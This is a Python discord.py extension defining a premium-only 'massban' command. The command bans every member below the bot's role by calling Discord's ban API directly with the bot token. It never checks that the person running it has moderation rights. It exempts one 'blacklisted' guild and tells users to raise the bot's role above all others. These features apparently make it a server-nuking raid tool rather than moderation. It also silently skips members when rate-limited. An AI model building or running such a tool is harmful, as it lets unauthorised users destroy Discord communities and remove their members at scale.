import asyncio

import aiohttp
import discord
from discord.ext import commands

from config import BLACKLISTED_GUILD_ID
from core.bot import bot
from core.utils import is_premium_user


class Massban(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def massban(self, ctx):
        guild = ctx.guild
        author = ctx.author

        if not is_premium_user(author.id):
            await ctx.send("💎 This command is only available for premium users.")
            return

        if guild.id == BLACKLISTED_GUILD_ID:
            await ctx.send("`this server is blacklisted`")
            return

        members_to_ban = [m for m in guild.members if m != author and guild.me.top_role > m.top_role]
        total = len(members_to_ban)
        count = 0

        confirm_msg = await ctx.send(
            f"🚀 **Trying to ban {total} members...**\n\n"
            f"⚠️ Make sure to put the bot's role **above every other role**.\n"
            f"The bot can only ban users that are **under** its role.\n\n"
            f"React with ✅ to confirm or ❌ to cancel."
        )
        await confirm_msg.add_reaction("✅")
        await confirm_msg.add_reaction("❌")

        def check(reaction, user):
            return (
                user == author
                and str(reaction.emoji) in ["✅", "❌"]
                and reaction.message.id == confirm_msg.id
            )

        try:
            reaction, user = await self.bot.wait_for("reaction_add", timeout=30.0, check=check)
        except asyncio.TimeoutError:
            await ctx.send("❌ Timed out — massban cancelled.")
            return

        if str(reaction.emoji) == "❌":
            await ctx.send("❌ Cancelled massban.")
            return

        await ctx.send(f"🚀 Starting to ban {total} members...")

        async with aiohttp.ClientSession() as session:
            for member in members_to_ban:
                try:
                    url = f"https://discord.com/api/v10/guilds/{guild.id}/bans/{member.id}"
                    headers = {
                        "Authorization": f"Bot {self.bot.http.token}",
                        "Content-Type": "application/json"
                    }
                    json_data = {"delete_message_days": 0, "reason": "Massban"}

                    async with session.put(url, json=json_data, headers=headers) as resp:
                        if resp.status == 429:
                            data = await resp.json()
                            retry_after = data.get("retry_after", 1)
                            print(f"[!] Ratelimit: wait {retry_after} seconds...")
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status in (200, 201, 204):
                            count += 1
                            print(f"[{count}/{total}] Banned: {member}")
                        else:
                            print(f"[!] Error while banning {member}: {resp.status}")
                except Exception as e:
                    print(f"[!] Can't ban {member}: {e}")

        await ctx.send(f"✅ Massban complete — {count}/{total} users banned.")


async def setup(bot):
    await bot.add_cog(Massban(bot))
